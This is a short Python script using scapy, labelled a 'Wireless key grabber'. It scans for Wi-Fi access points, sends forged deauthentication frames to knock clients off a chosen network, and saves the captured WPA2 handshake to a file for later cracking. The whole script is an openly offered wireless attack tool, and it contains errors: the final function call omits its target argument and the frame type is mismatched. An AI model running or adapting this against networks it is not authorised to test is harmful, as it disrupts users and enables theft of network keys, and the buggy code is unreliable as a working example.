#!/usr/bin/env python
# 
# Name: Wireless key grabber.
# Desc: Scans for wifi then attempts to deauth the network and sniffs the handshake.

from scapy.all import *

def banner():
  print ""
  print "Wifi WPA2 Handshake Grabber"
  print ""
  
def wifiscan():
  print("")
  print("Scanning for wireless access points")
  print("")
  ap_list = []
  def PacketHandler(pkt) :
    if pkt.haslayer(Dot11) :
      if pkt.type == 0 and pkt.subtype == 8:
        if pkt.addr2 not in ap_list:
          ap_list.append(pkt.addr2)
          print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
  sniff(iface="mon0", prn = PacketHandler, count = 10)

def grab_handshake(target):
  print("")
  count = 2
  conf.iface='mon0'
  packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target)/Dot11Deauth(reason=7)
  for n in range(int(count)):
    sendp(packet)
    handshake=sniff(iface='mon0',count=250)
    data = PcapWriter("handshake.cap", append=True, sync=True)
    data.write(handshake)
    print(handshake.summary)

banner()
wifiscan()
target = raw_input("Please type a target MAC address : ")
grab_handshake()
